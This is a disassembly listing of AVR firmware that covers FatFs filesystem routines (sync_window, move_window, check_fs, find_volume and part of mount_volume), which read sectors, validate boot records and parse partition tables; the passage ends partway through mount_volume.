    1092:	a9 01       	movw	r20, r18
    1094:	98 01       	movw	r18, r16
    1096:	28 0f       	add	r18, r24
    1098:	39 1f       	adc	r19, r25
    109a:	4a 1f       	adc	r20, r26
    109c:	5b 1f       	adc	r21, r27
    109e:	01 e0       	ldi	r16, 0x01	; 1
    10a0:	10 e0       	ldi	r17, 0x00	; 0
    10a2:	b7 01       	movw	r22, r14
    10a4:	89 81       	ldd	r24, Y+1	; 0x01
    10a6:	59 de       	rcall	.-846    	; 0xd5a <disk_write>
    10a8:	80 e0       	ldi	r24, 0x00	; 0
    10aa:	07 c0       	rjmp	.+14     	; 0x10ba <sync_window+0x9a>
    10ac:	80 e0       	ldi	r24, 0x00	; 0
    10ae:	05 c0       	rjmp	.+10     	; 0x10ba <sync_window+0x9a>
    10b0:	81 e0       	ldi	r24, 0x01	; 1
    10b2:	03 c0       	rjmp	.+6      	; 0x10ba <sync_window+0x9a>
    10b4:	80 e0       	ldi	r24, 0x00	; 0
    10b6:	01 c0       	rjmp	.+2      	; 0x10ba <sync_window+0x9a>
    10b8:	80 e0       	ldi	r24, 0x00	; 0
    10ba:	df 91       	pop	r29
    10bc:	cf 91       	pop	r28
    10be:	1f 91       	pop	r17
    10c0:	0f 91       	pop	r16
    10c2:	ff 90       	pop	r15
    10c4:	ef 90       	pop	r14
    10c6:	bf 90       	pop	r11
    10c8:	af 90       	pop	r10
    10ca:	9f 90       	pop	r9
    10cc:	8f 90       	pop	r8
    10ce:	08 95       	ret

000010d0 <move_window>:
    10d0:	8f 92       	push	r8
    10d2:	9f 92       	push	r9
    10d4:	af 92       	push	r10
    10d6:	bf 92       	push	r11
    10d8:	ff 92       	push	r15
    10da:	0f 93       	push	r16
    10dc:	1f 93       	push	r17
    10de:	cf 93       	push	r28
    10e0:	df 93       	push	r29
    10e2:	ec 01       	movw	r28, r24
    10e4:	4a 01       	movw	r8, r20
    10e6:	5b 01       	movw	r10, r22
    10e8:	8f a5       	ldd	r24, Y+47	; 0x2f
    10ea:	98 a9       	ldd	r25, Y+48	; 0x30
    10ec:	a9 a9       	ldd	r26, Y+49	; 0x31
    10ee:	ba a9       	ldd	r27, Y+50	; 0x32
    10f0:	84 17       	cp	r24, r20
    10f2:	95 07       	cpc	r25, r21
    10f4:	a6 07       	cpc	r26, r22
    10f6:	b7 07       	cpc	r27, r23
    10f8:	d9 f0       	breq	.+54     	; 0x1130 <move_window+0x60>
    10fa:	ce 01       	movw	r24, r28
    10fc:	91 df       	rcall	.-222    	; 0x1020 <sync_window>
    10fe:	f8 2e       	mov	r15, r24
    1100:	81 11       	cpse	r24, r1
    1102:	17 c0       	rjmp	.+46     	; 0x1132 <move_window+0x62>
    1104:	01 e0       	ldi	r16, 0x01	; 1
    1106:	10 e0       	ldi	r17, 0x00	; 0
    1108:	a5 01       	movw	r20, r10
    110a:	94 01       	movw	r18, r8
    110c:	be 01       	movw	r22, r28
    110e:	6d 5c       	subi	r22, 0xCD	; 205
    1110:	7f 4f       	sbci	r23, 0xFF	; 255
    1112:	89 81       	ldd	r24, Y+1	; 0x01
    1114:	12 de       	rcall	.-988    	; 0xd3a <disk_read>
    1116:	88 23       	and	r24, r24
    1118:	31 f0       	breq	.+12     	; 0x1126 <move_window+0x56>
    111a:	ff 24       	eor	r15, r15
    111c:	f3 94       	inc	r15
    111e:	88 24       	eor	r8, r8
    1120:	8a 94       	dec	r8
    1122:	98 2c       	mov	r9, r8
    1124:	54 01       	movw	r10, r8
    1126:	8f a6       	std	Y+47, r8	; 0x2f
    1128:	98 aa       	std	Y+48, r9	; 0x30
    112a:	a9 aa       	std	Y+49, r10	; 0x31
    112c:	ba aa       	std	Y+50, r11	; 0x32
    112e:	01 c0       	rjmp	.+2      	; 0x1132 <move_window+0x62>
    1130:	f1 2c       	mov	r15, r1
    1132:	8f 2d       	mov	r24, r15
    1134:	df 91       	pop	r29
    1136:	cf 91       	pop	r28
    1138:	1f 91       	pop	r17
    113a:	0f 91       	pop	r16
    113c:	ff 90       	pop	r15
    113e:	bf 90       	pop	r11
    1140:	af 90       	pop	r10
    1142:	9f 90       	pop	r9
    1144:	8f 90       	pop	r8
    1146:	08 95       	ret

00001148 <check_fs>:
    1148:	ef 92       	push	r14
    114a:	ff 92       	push	r15
    114c:	0f 93       	push	r16
    114e:	1f 93       	push	r17
    1150:	cf 93       	push	r28
    1152:	df 93       	push	r29
    1154:	ec 01       	movw	r28, r24
    1156:	1b 82       	std	Y+3, r1	; 0x03
    1158:	8f ef       	ldi	r24, 0xFF	; 255
    115a:	9f ef       	ldi	r25, 0xFF	; 255
    115c:	dc 01       	movw	r26, r24
    115e:	8f a7       	std	Y+47, r24	; 0x2f
    1160:	98 ab       	std	Y+48, r25	; 0x30
    1162:	a9 ab       	std	Y+49, r26	; 0x31
    1164:	ba ab       	std	Y+50, r27	; 0x32
    1166:	ce 01       	movw	r24, r28
    1168:	b3 df       	rcall	.-154    	; 0x10d0 <move_window>
    116a:	81 11       	cpse	r24, r1
    116c:	72 c0       	rjmp	.+228    	; 0x1252 <check_fs+0x10a>
    116e:	ce 01       	movw	r24, r28
    1170:	8f 5c       	subi	r24, 0xCF	; 207
    1172:	9d 4f       	sbci	r25, 0xFD	; 253
    1174:	0e de       	rcall	.-996    	; 0xd92 <ld_word>
    1176:	7c 01       	movw	r14, r24
    1178:	8b a9       	ldd	r24, Y+51	; 0x33
    117a:	8b 3e       	cpi	r24, 0xEB	; 235
    117c:	29 f0       	breq	.+10     	; 0x1188 <check_fs+0x40>
    117e:	89 3e       	cpi	r24, 0xE9	; 233
    1180:	19 f0       	breq	.+6      	; 0x1188 <check_fs+0x40>
    1182:	88 3e       	cpi	r24, 0xE8	; 232
    1184:	09 f0       	breq	.+2      	; 0x1188 <check_fs+0x40>
    1186:	5d c0       	rjmp	.+186    	; 0x1242 <check_fs+0xfa>
    1188:	25 e5       	ldi	r18, 0x55	; 85
    118a:	e2 16       	cp	r14, r18
    118c:	2a ea       	ldi	r18, 0xAA	; 170
    118e:	f2 06       	cpc	r15, r18
    1190:	61 f4       	brne	.+24     	; 0x11aa <check_fs+0x62>
    1192:	48 e0       	ldi	r20, 0x08	; 8
    1194:	50 e0       	ldi	r21, 0x00	; 0
    1196:	68 ed       	ldi	r22, 0xD8	; 216
    1198:	73 e0       	ldi	r23, 0x03	; 3
    119a:	ce 01       	movw	r24, r28
    119c:	8b 57       	subi	r24, 0x7B	; 123
    119e:	9f 4f       	sbci	r25, 0xFF	; 255
    11a0:	0e 94 ff 38 	call	0x71fe	; 0x71fe <memcmp>
    11a4:	89 2b       	or	r24, r25
    11a6:	09 f4       	brne	.+2      	; 0x11aa <check_fs+0x62>
    11a8:	57 c0       	rjmp	.+174    	; 0x1258 <check_fs+0x110>
    11aa:	ce 01       	movw	r24, r28
    11ac:	ce 96       	adiw	r24, 0x3e	; 62
    11ae:	f1 dd       	rcall	.-1054   	; 0xd92 <ld_word>
    11b0:	fe 01       	movw	r30, r28
    11b2:	e0 5c       	subi	r30, 0xC0	; 192
    11b4:	ff 4f       	sbci	r31, 0xFF	; 255
    11b6:	20 81       	ld	r18, Z
    11b8:	8c 01       	movw	r16, r24
    11ba:	01 50       	subi	r16, 0x01	; 1
    11bc:	11 09       	sbc	r17, r1
    11be:	08 23       	and	r16, r24
    11c0:	19 23       	and	r17, r25
    11c2:	01 15       	cp	r16, r1
    11c4:	11 05       	cpc	r17, r1
    11c6:	09 f0       	breq	.+2      	; 0x11ca <check_fs+0x82>
    11c8:	3c c0       	rjmp	.+120    	; 0x1242 <check_fs+0xfa>
    11ca:	81 15       	cp	r24, r1
    11cc:	32 e0       	ldi	r19, 0x02	; 2
    11ce:	93 07       	cpc	r25, r19
    11d0:	c0 f1       	brcs	.+112    	; 0x1242 <check_fs+0xfa>
    11d2:	81 30       	cpi	r24, 0x01	; 1
    11d4:	92 40       	sbci	r25, 0x02	; 2
    11d6:	a8 f5       	brcc	.+106    	; 0x1242 <check_fs+0xfa>
    11d8:	22 23       	and	r18, r18
    11da:	99 f1       	breq	.+102    	; 0x1242 <check_fs+0xfa>
    11dc:	82 2f       	mov	r24, r18
    11de:	90 e0       	ldi	r25, 0x00	; 0
    11e0:	9c 01       	movw	r18, r24
    11e2:	21 50       	subi	r18, 0x01	; 1
    11e4:	31 09       	sbc	r19, r1
    11e6:	82 23       	and	r24, r18
    11e8:	93 23       	and	r25, r19
    11ea:	89 2b       	or	r24, r25
    11ec:	51 f5       	brne	.+84     	; 0x1242 <check_fs+0xfa>
    11ee:	ce 01       	movw	r24, r28
    11f0:	8f 5b       	subi	r24, 0xBF	; 191
    11f2:	9f 4f       	sbci	r25, 0xFF	; 255
    11f4:	ce dd       	rcall	.-1124   	; 0xd92 <ld_word>
    11f6:	89 2b       	or	r24, r25
    11f8:	21 f1       	breq	.+72     	; 0x1242 <check_fs+0xfa>
    11fa:	fe 01       	movw	r30, r28
    11fc:	ed 5b       	subi	r30, 0xBD	; 189
    11fe:	ff 4f       	sbci	r31, 0xFF	; 255
    1200:	80 81       	ld	r24, Z
    1202:	90 e0       	ldi	r25, 0x00	; 0
    1204:	01 97       	sbiw	r24, 0x01	; 1
    1206:	02 97       	sbiw	r24, 0x02	; 2
    1208:	e0 f4       	brcc	.+56     	; 0x1242 <check_fs+0xfa>
    120a:	ce 01       	movw	r24, r28
    120c:	8c 5b       	subi	r24, 0xBC	; 188
    120e:	9f 4f       	sbci	r25, 0xFF	; 255
    1210:	c0 dd       	rcall	.-1152   	; 0xd92 <ld_word>
    1212:	89 2b       	or	r24, r25
    1214:	b1 f0       	breq	.+44     	; 0x1242 <check_fs+0xfa>
    1216:	ce 01       	movw	r24, r28
    1218:	8a 5b       	subi	r24, 0xBA	; 186
    121a:	9f 4f       	sbci	r25, 0xFF	; 255
    121c:	ba dd       	rcall	.-1164   	; 0xd92 <ld_word>
    121e:	80 38       	cpi	r24, 0x80	; 128
    1220:	91 05       	cpc	r25, r1
    1222:	48 f4       	brcc	.+18     	; 0x1236 <check_fs+0xee>
    1224:	ce 01       	movw	r24, r28
    1226:	8d 5a       	subi	r24, 0xAD	; 173
    1228:	9f 4f       	sbci	r25, 0xFF	; 255
    122a:	bd dd       	rcall	.-1158   	; 0xda6 <ld_dword>
    122c:	61 15       	cp	r22, r1
    122e:	71 05       	cpc	r23, r1
    1230:	81 40       	sbci	r24, 0x01	; 1
    1232:	91 05       	cpc	r25, r1
    1234:	30 f0       	brcs	.+12     	; 0x1242 <check_fs+0xfa>
    1236:	ce 01       	movw	r24, r28
    1238:	87 5b       	subi	r24, 0xB7	; 183
    123a:	9f 4f       	sbci	r25, 0xFF	; 255
    123c:	aa dd       	rcall	.-1196   	; 0xd92 <ld_word>
    123e:	89 2b       	or	r24, r25
    1240:	81 f4       	brne	.+32     	; 0x1262 <check_fs+0x11a>
    1242:	35 e5       	ldi	r19, 0x55	; 85
    1244:	e3 16       	cp	r14, r19
    1246:	3a ea       	ldi	r19, 0xAA	; 170
    1248:	f3 06       	cpc	r15, r19
    124a:	49 f4       	brne	.+18     	; 0x125e <check_fs+0x116>
    124c:	02 e0       	ldi	r16, 0x02	; 2
    124e:	10 e0       	ldi	r17, 0x00	; 0
    1250:	08 c0       	rjmp	.+16     	; 0x1262 <check_fs+0x11a>
    1252:	04 e0       	ldi	r16, 0x04	; 4
    1254:	10 e0       	ldi	r17, 0x00	; 0
    1256:	05 c0       	rjmp	.+10     	; 0x1262 <check_fs+0x11a>
    1258:	00 e0       	ldi	r16, 0x00	; 0
    125a:	10 e0       	ldi	r17, 0x00	; 0
    125c:	02 c0       	rjmp	.+4      	; 0x1262 <check_fs+0x11a>
    125e:	03 e0       	ldi	r16, 0x03	; 3
    1260:	10 e0       	ldi	r17, 0x00	; 0
    1262:	c8 01       	movw	r24, r16
    1264:	df 91       	pop	r29
    1266:	cf 91       	pop	r28
    1268:	1f 91       	pop	r17
    126a:	0f 91       	pop	r16
    126c:	ff 90       	pop	r15
    126e:	ef 90       	pop	r14
    1270:	08 95       	ret

00001272 <find_volume>:
    1272:	cf 92       	push	r12
    1274:	df 92       	push	r13
    1276:	ef 92       	push	r14
    1278:	ff 92       	push	r15
    127a:	0f 93       	push	r16
    127c:	1f 93       	push	r17
    127e:	cf 93       	push	r28
    1280:	df 93       	push	r29
    1282:	cd b7       	in	r28, 0x3d	; 61
    1284:	de b7       	in	r29, 0x3e	; 62
    1286:	60 97       	sbiw	r28, 0x10	; 16
    1288:	0f b6       	in	r0, 0x3f	; 63
    128a:	f8 94       	cli
    128c:	de bf       	out	0x3e, r29	; 62
    128e:	0f be       	out	0x3f, r0	; 63
    1290:	cd bf       	out	0x3d, r28	; 61
    1292:	6c 01       	movw	r12, r24
    1294:	7b 01       	movw	r14, r22
    1296:	40 e0       	ldi	r20, 0x00	; 0
    1298:	50 e0       	ldi	r21, 0x00	; 0
    129a:	ba 01       	movw	r22, r20
    129c:	55 df       	rcall	.-342    	; 0x1148 <check_fs>
    129e:	82 30       	cpi	r24, 0x02	; 2
    12a0:	91 05       	cpc	r25, r1
    12a2:	51 f1       	breq	.+84     	; 0x12f8 <find_volume+0x86>
    12a4:	08 f0       	brcs	.+2      	; 0x12a8 <find_volume+0x36>
    12a6:	5a c0       	rjmp	.+180    	; 0x135c <find_volume+0xea>
    12a8:	e1 14       	cp	r14, r1
    12aa:	f1 04       	cpc	r15, r1
    12ac:	09 f4       	brne	.+2      	; 0x12b0 <find_volume+0x3e>
    12ae:	56 c0       	rjmp	.+172    	; 0x135c <find_volume+0xea>
    12b0:	00 e0       	ldi	r16, 0x00	; 0
    12b2:	10 e0       	ldi	r17, 0x00	; 0
    12b4:	23 c0       	rjmp	.+70     	; 0x12fc <find_volume+0x8a>
    12b6:	c8 01       	movw	r24, r16
    12b8:	82 95       	swap	r24
    12ba:	92 95       	swap	r25
    12bc:	90 7f       	andi	r25, 0xF0	; 240
    12be:	98 27       	eor	r25, r24
    12c0:	80 7f       	andi	r24, 0xF0	; 240
    12c2:	98 27       	eor	r25, r24
    12c4:	8a 53       	subi	r24, 0x3A	; 58
    12c6:	9e 4f       	sbci	r25, 0xFE	; 254
    12c8:	96 01       	movw	r18, r12
    12ca:	2d 5c       	subi	r18, 0xCD	; 205
    12cc:	3f 4f       	sbci	r19, 0xFF	; 255
    12ce:	82 0f       	add	r24, r18
    12d0:	93 1f       	adc	r25, r19
    12d2:	69 dd       	rcall	.-1326   	; 0xda6 <ld_dword>
    12d4:	f8 01       	movw	r30, r16
    12d6:	ee 0f       	add	r30, r30
    12d8:	ff 1f       	adc	r31, r31
    12da:	ee 0f       	add	r30, r30
    12dc:	ff 1f       	adc	r31, r31
    12de:	21 e0       	ldi	r18, 0x01	; 1
    12e0:	30 e0       	ldi	r19, 0x00	; 0
    12e2:	2c 0f       	add	r18, r28
    12e4:	3d 1f       	adc	r19, r29
    12e6:	e2 0f       	add	r30, r18
    12e8:	f3 1f       	adc	r31, r19
    12ea:	60 83       	st	Z, r22
    12ec:	71 83       	std	Z+1, r23	; 0x01
    12ee:	82 83       	std	Z+2, r24	; 0x02
    12f0:	93 83       	std	Z+3, r25	; 0x03
    12f2:	0f 5f       	subi	r16, 0xFF	; 255
    12f4:	1f 4f       	sbci	r17, 0xFF	; 255
    12f6:	02 c0       	rjmp	.+4      	; 0x12fc <find_volume+0x8a>
    12f8:	00 e0       	ldi	r16, 0x00	; 0
    12fa:	10 e0       	ldi	r17, 0x00	; 0
    12fc:	04 30       	cpi	r16, 0x04	; 4
    12fe:	11 05       	cpc	r17, r1
    1300:	d0 f2       	brcs	.-76     	; 0x12b6 <find_volume+0x44>
    1302:	e1 14       	cp	r14, r1
    1304:	f1 04       	cpc	r15, r1
    1306:	21 f0       	breq	.+8      	; 0x1310 <find_volume+0x9e>
    1308:	87 01       	movw	r16, r14
    130a:	01 50       	subi	r16, 0x01	; 1
    130c:	11 09       	sbc	r17, r1
    130e:	02 c0       	rjmp	.+4      	; 0x1314 <find_volume+0xa2>
    1310:	00 e0       	ldi	r16, 0x00	; 0
    1312:	10 e0       	ldi	r17, 0x00	; 0
    1314:	f8 01       	movw	r30, r16
    1316:	ee 0f       	add	r30, r30
    1318:	ff 1f       	adc	r31, r31
    131a:	ee 0f       	add	r30, r30
    131c:	ff 1f       	adc	r31, r31
    131e:	81 e0       	ldi	r24, 0x01	; 1
    1320:	90 e0       	ldi	r25, 0x00	; 0
    1322:	8c 0f       	add	r24, r28
    1324:	9d 1f       	adc	r25, r29
    1326:	e8 0f       	add	r30, r24
    1328:	f9 1f       	adc	r31, r25
    132a:	40 81       	ld	r20, Z
    132c:	51 81       	ldd	r21, Z+1	; 0x01
    132e:	62 81       	ldd	r22, Z+2	; 0x02
    1330:	73 81       	ldd	r23, Z+3	; 0x03
    1332:	41 15       	cp	r20, r1
    1334:	51 05       	cpc	r21, r1
    1336:	61 05       	cpc	r22, r1
    1338:	71 05       	cpc	r23, r1
    133a:	19 f0       	breq	.+6      	; 0x1342 <find_volume+0xd0>
    133c:	c6 01       	movw	r24, r12
    133e:	04 df       	rcall	.-504    	; 0x1148 <check_fs>
    1340:	02 c0       	rjmp	.+4      	; 0x1346 <find_volume+0xd4>
    1342:	83 e0       	ldi	r24, 0x03	; 3
    1344:	90 e0       	ldi	r25, 0x00	; 0
    1346:	e1 14       	cp	r14, r1
    1348:	f1 04       	cpc	r15, r1
    134a:	41 f4       	brne	.+16     	; 0x135c <find_volume+0xea>
    134c:	82 30       	cpi	r24, 0x02	; 2
    134e:	91 05       	cpc	r25, r1
    1350:	28 f0       	brcs	.+10     	; 0x135c <find_volume+0xea>
    1352:	0f 5f       	subi	r16, 0xFF	; 255
    1354:	1f 4f       	sbci	r17, 0xFF	; 255
    1356:	04 30       	cpi	r16, 0x04	; 4
    1358:	11 05       	cpc	r17, r1
    135a:	e0 f2       	brcs	.-72     	; 0x1314 <find_volume+0xa2>
    135c:	60 96       	adiw	r28, 0x10	; 16
    135e:	0f b6       	in	r0, 0x3f	; 63
    1360:	f8 94       	cli
    1362:	de bf       	out	0x3e, r29	; 62
    1364:	0f be       	out	0x3f, r0	; 63
    1366:	cd bf       	out	0x3d, r28	; 61
    1368:	df 91       	pop	r29
    136a:	cf 91       	pop	r28
    136c:	1f 91       	pop	r17
    136e:	0f 91       	pop	r16
    1370:	ff 90       	pop	r15
    1372:	ef 90       	pop	r14
    1374:	df 90       	pop	r13
    1376:	cf 90       	pop	r12
    1378:	08 95       	ret

0000137a <mount_volume>:
    137a:	2f 92       	push	r2
    137c:	3f 92       	push	r3
    137e:	4f 92       	push	r4
    1380:	5f 92       	push	r5
    1382:	6f 92       	push	r6
    1384:	7f 92       	push	r7
    1386:	8f 92       	push	r8
    1388:	9f 92       	push	r9
    138a:	af 92       	push	r10
    138c:	bf 92       	push	r11
    138e:	cf 92       	push	r12
    1390:	df 92       	push	r13
    1392:	ef 92       	push	r14
    1394:	ff 92       	push	r15
    1396:	0f 93       	push	r16
    1398:	1f 93       	push	r17
    139a:	cf 93       	push	r28
    139c:	df 93       	push	r29
    139e:	cd b7       	in	r28, 0x3d	; 61
    13a0:	de b7       	in	r29, 0x3e	; 62
    13a2:	2e 97       	sbiw	r28, 0x0e	; 14
    13a4:	0f b6       	in	r0, 0x3f	; 63
    13a6:	f8 94       	cli
    13a8:	de bf       	out	0x3e, r29	; 62
    13aa:	0f be       	out	0x3f, r0	; 63
    13ac:	cd bf       	out	0x3d, r28	; 61
    13ae:	7b 01       	movw	r14, r22
    13b0:	d4 2e       	mov	r13, r20
    13b2:	db 01       	movw	r26, r22
    13b4:	1d 92       	st	X+, r1
    13b6:	1c 92       	st	X, r1
    13b8:	c7 dd       	rcall	.-1138   	; 0xf48 <get_ldnumber>
    13ba:	8c 01       	movw	r16, r24
    13bc:	99 23       	and	r25, r25
    13be:	0c f4       	brge	.+2      	; 0x13c2 <mount_volume+0x48>
    13c0:	17 c2       	rjmp	.+1070   	; 0x17f0 <mount_volume+0x476>
    13c2:	fc 01       	movw	r30, r24
    13c4:	ee 0f       	add	r30, r30
    13c6:	ff 1f       	adc	r31, r31
    13c8:	e4 5b       	subi	r30, 0xB4	; 180
    13ca:	f6 4f       	sbci	r31, 0xF6	; 246
    13cc:	20 81       	ld	r18, Z
    13ce:	31 81       	ldd	r19, Z+1	; 0x01
    13d0:	3e 87       	std	Y+14, r19	; 0x0e
    13d2:	2d 87       	std	Y+13, r18	; 0x0d
    13d4:	21 15       	cp	r18, r1
    13d6:	31 05       	cpc	r19, r1
    13d8:	09 f4       	brne	.+2      	; 0x13dc <mount_volume+0x62>
    13da:	0c c2       	rjmp	.+1048   	; 0x17f4 <mount_volume+0x47a>
    13dc:	d7 01       	movw	r26, r14
    13de:	2d 93       	st	X+, r18
    13e0:	3c 93       	st	X, r19
    13e2:	bd 2d       	mov	r27, r13
    13e4:	be 7f       	andi	r27, 0xFE	; 254
    13e6:	db 2e       	mov	r13, r27
    13e8:	f9 01       	movw	r30, r18
    13ea:	80 81       	ld	r24, Z
    13ec:	88 23       	and	r24, r24
    13ee:	59 f0       	breq	.+22     	; 0x1406 <mount_volume+0x8c>
    13f0:	81 81       	ldd	r24, Z+1	; 0x01
    13f2:	95 dc       	rcall	.-1750   	; 0xd1e <disk_status>
    13f4:	80 fd       	sbrc	r24, 0
    13f6:	07 c0       	rjmp	.+14     	; 0x1406 <mount_volume+0x8c>
    13f8:	dd 20       	and	r13, r13
    13fa:	09 f4       	brne	.+2      	; 0x13fe <mount_volume+0x84>
    13fc:	fd c1       	rjmp	.+1018   	; 0x17f8 <mount_volume+0x47e>
    13fe:	82 fd       	sbrc	r24, 2
    1400:	fd c1       	rjmp	.+1018   	; 0x17fc <mount_volume+0x482>
    1402:	80 e0       	ldi	r24, 0x00	; 0
    1404:	1e c2       	rjmp	.+1084   	; 0x1842 <mount_volume+0x4c8>
    1406:	ad 85       	ldd	r26, Y+13	; 0x0d
    1408:	be 85       	ldd	r27, Y+14	; 0x0e
    140a:	1c 92       	st	X, r1
    140c:	11 96       	adiw	r26, 0x01	; 1
    140e:	0c 93       	st	X, r16
    1410:	80 2f       	mov	r24, r16
    1412:	8c dc       	rcall	.-1768   	; 0xd2c <disk_initialize>
    1414:	80 fd       	sbrc	r24, 0
    1416:	f4 c1       	rjmp	.+1000   	; 0x1800 <mount_volume+0x486>
    1418:	dd 20       	and	r13, r13
    141a:	11 f0       	breq	.+4      	; 0x1420 <mount_volume+0xa6>
    141c:	82 fd       	sbrc	r24, 2
    141e:	f2 c1       	rjmp	.+996    	; 0x1804 <mount_volume+0x48a>
    1420:	60 e0       	ldi	r22, 0x00	; 0
    1422:	70 e0       	ldi	r23, 0x00	; 0
    1424:	8d 85       	ldd	r24, Y+13	; 0x0d
    1426:	9e 85       	ldd	r25, Y+14	; 0x0e
    1428:	24 df       	rcall	.-440    	; 0x1272 <find_volume>
    142a:	84 30       	cpi	r24, 0x04	; 4
    142c:	91 05       	cpc	r25, r1
    142e:	09 f4       	brne	.+2      	; 0x1432 <mount_volume+0xb8>
    1430:	eb c1       	rjmp	.+982    	; 0x1808 <mount_volume+0x48e>
    1432:	02 97       	sbiw	r24, 0x02	; 2
    1434:	08 f0       	brcs	.+2      	; 0x1438 <mount_volume+0xbe>
    1436:	ea c1       	rjmp	.+980    	; 0x180c <mount_volume+0x492>
    1438:	ed 85       	ldd	r30, Y+13	; 0x0d
    143a:	fe 85       	ldd	r31, Y+14	; 0x0e
    143c:	47 a4       	ldd	r4, Z+47	; 0x2f
    143e:	50 a8       	ldd	r5, Z+48	; 0x30
    1440:	61 a8       	ldd	r6, Z+49	; 0x31
    1442:	72 a8       	ldd	r7, Z+50	; 0x32
    1444:	cf 01       	movw	r24, r30
    1446:	ce 96       	adiw	r24, 0x3e	; 62
    1448:	a4 dc       	rcall	.-1720   	; 0xd92 <ld_word>
    144a:	81 15       	cp	r24, r1
    144c:	92 40       	sbci	r25, 0x02	; 2
    144e:	09 f0       	breq	.+2      	; 0x1452 <mount_volume+0xd8>
    1450:	df c1       	rjmp	.+958    	; 0x1810 <mount_volume+0x496>
    1452:	8d 85       	ldd	r24, Y+13	; 0x0d
    1454:	9e 85       	ldd	r25, Y+14	; 0x0e
    1456:	87 5b       	subi	r24, 0xB7	; 183
    1458:	9f 4f       	sbci	r25, 0xFF	; 255
    145a:	9b dc       	rcall	.-1738   	; 0xd92 <ld_word>
    145c:	4c 01       	movw	r8, r24
    145e:	a1 2c       	mov	r10, r1
    1460:	b1 2c       	mov	r11, r1
    1462:	81 14       	cp	r8, r1
    1464:	91 04       	cpc	r9, r1
    1466:	a1 04       	cpc	r10, r1
    1468:	b1 04       	cpc	r11, r1
    146a:	39 f4       	brne	.+14     	; 0x147a <mount_volume+0x100>
    146c:	8d 85       	ldd	r24, Y+13	; 0x0d
    146e:	9e 85       	ldd	r25, Y+14	; 0x0e
    1470:	89 5a       	subi	r24, 0xA9	; 169
    1472:	9f 4f       	sbci	r25, 0xFF	; 255
    1474:	98 dc       	rcall	.-1744   	; 0xda6 <ld_dword>
    1476:	4b 01       	movw	r8, r22
    1478:	5c 01       	movw	r10, r24
    147a:	ad 85       	ldd	r26, Y+13	; 0x0d
    147c:	be 85       	ldd	r27, Y+14	; 0x0e
    147e:	5b 96       	adiw	r26, 0x1b	; 27
    1480:	8d 92       	st	X+, r8
    1482:	9d 92       	st	X+, r9
    1484:	ad 92       	st	X+, r10
    1486:	bc 92       	st	X, r11
    1488:	5e 97       	sbiw	r26, 0x1e	; 30
    148a:	fd 01       	movw	r30, r26
    148c:	ed 5b       	subi	r30, 0xBD	; 189
    148e:	ff 4f       	sbci	r31, 0xFF	; 255
    1490:	a0 81       	ld	r26, Z
    1492:	ed 85       	ldd	r30, Y+13	; 0x0d
    1494:	fe 85       	ldd	r31, Y+14	; 0x0e
    1496:	a2 83       	std	Z+2, r26	; 0x02
    1498:	8f ef       	ldi	r24, 0xFF	; 255
    149a:	8a 0f       	add	r24, r26
    149c:	82 30       	cpi	r24, 0x02	; 2
    149e:	08 f0       	brcs	.+2      	; 0x14a2 <mount_volume+0x128>
    14a0:	b9 c1       	rjmp	.+882    	; 0x1814 <mount_volume+0x49a>
    14a2:	b0 e0       	ldi	r27, 0x00	; 0
    14a4:	a5 01       	movw	r20, r10
    14a6:	94 01       	movw	r18, r8
    14a8:	0e 94 e5 38 	call	0x71ca	; 0x71ca <__muluhisi3>
    14ac:	6d 83       	std	Y+5, r22	; 0x05
    14ae:	7e 83       	std	Y+6, r23	; 0x06
    14b0:	8f 83       	std	Y+7, r24	; 0x07
    14b2:	98 87       	std	Y+8, r25	; 0x08
    14b4:	e0 5c       	subi	r30, 0xC0	; 192
    14b6:	ff 4f       	sbci	r31, 0xFF	; 255
    14b8:	00 81       	ld	r16, Z
    14ba:	10 e0       	ldi	r17, 0x00	; 0
    14bc:	ad 85       	ldd	r26, Y+13	; 0x0d
    14be:	be 85       	ldd	r27, Y+14	; 0x0e
    14c0:	1a 96       	adiw	r26, 0x0a	; 10
    14c2:	1c 93       	st	X, r17
    14c4:	0e 93       	st	-X, r16
    14c6:	19 97       	sbiw	r26, 0x09	; 9
    14c8:	01 15       	cp	r16, r1
    14ca:	11 05       	cpc	r17, r1
    14cc:	09 f4       	brne	.+2      	; 0x14d0 <mount_volume+0x156>
    14ce:	a4 c1       	rjmp	.+840    	; 0x1818 <mount_volume+0x49e>
    14d0:	c8 01       	movw	r24, r16
    14d2:	01 97       	sbiw	r24, 0x01	; 1
    14d4:	80 23       	and	r24, r16
    14d6:	91 23       	and	r25, r17
    14d8:	89 2b       	or	r24, r25
    14da:	09 f0       	breq	.+2      	; 0x14de <mount_volume+0x164>
    14dc:	9f c1       	rjmp	.+830    	; 0x181c <mount_volume+0x4a2>
    14de:	cd 01       	movw	r24, r26
    14e0:	8c 5b       	subi	r24, 0xBC	; 188
    14e2:	9f 4f       	sbci	r25, 0xFF	; 255
    14e4:	56 dc       	rcall	.-1876   	; 0xd92 <ld_word>
    14e6:	1c 01       	movw	r2, r24
    14e8:	ed 85       	ldd	r30, Y+13	; 0x0d
    14ea:	fe 85       	ldd	r31, Y+14	; 0x0e
    14ec:	90 87       	std	Z+8, r25	; 0x08
    14ee:	87 83       	std	Z+7, r24	; 0x07
    14f0:	8f 70       	andi	r24, 0x0F	; 15
    14f2:	99 27       	eor	r25, r25
    14f4:	89 2b       	or	r24, r25
    14f6:	09 f0       	breq	.+2      	; 0x14fa <mount_volume+0x180>
    14f8:	93 c1       	rjmp	.+806    	; 0x1820 <mount_volume+0x4a6>
    14fa:	cf 01       	movw	r24, r30
    14fc:	8a 5b       	subi	r24, 0xBA	; 186
    14fe:	9f 4f       	sbci	r25, 0xFF	; 255
    1500:	48 dc       	rcall	.-1904   	; 0xd92 <ld_word>
    1502:	6c 01       	movw	r12, r24
    1504:	e1 2c       	mov	r14, r1
    1506:	f1 2c       	mov	r15, r1
    1508:	c1 14       	cp	r12, r1
    150a:	d1 04       	cpc	r13, r1
    150c:	e1 04       	cpc	r14, r1
    150e:	f1 04       	cpc	r15, r1
    1510:	39 f4       	brne	.+14     	; 0x1520 <mount_volume+0x1a6>
    1512:	8d 85       	ldd	r24, Y+13	; 0x0d
    1514:	9e 85       	ldd	r25, Y+14	; 0x0e
    1516:	8d 5a       	subi	r24, 0xAD	; 173
    1518:	9f 4f       	sbci	r25, 0xFF	; 255
    151a:	45 dc       	rcall	.-1910   	; 0xda6 <ld_dword>
    151c:	6b 01       	movw	r12, r22
    151e:	7c 01       	movw	r14, r24
    1520:	8d 85       	ldd	r24, Y+13	; 0x0d
    1522:	9e 85       	ldd	r25, Y+14	; 0x0e
    1524:	8f 5b       	subi	r24, 0xBF	; 191
